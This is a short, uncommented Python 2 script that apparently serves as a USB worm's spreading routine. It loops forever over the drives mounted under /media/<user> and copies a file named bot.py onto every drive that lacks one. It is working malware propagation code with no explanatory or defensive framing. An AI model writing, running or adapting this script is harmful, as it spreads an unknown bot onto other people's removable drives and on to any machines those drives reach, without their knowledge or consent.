import os
import shutil
lofin = os.getlogin()
print os.listdir("/media/"+lofin)
src = os.path.dirname(os.path.abspath(__file__))+"/bot.py"
print src
while (1):
    if len(os.listdir("/media/"+lofin)) > 0:
        for clef in os.listdir("/media/"+lofin):
            if not os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py"):
                destination = "/media/"+lofin +"/" + str(clef)
                print destination
                dest = shutil.copy(src,destination)
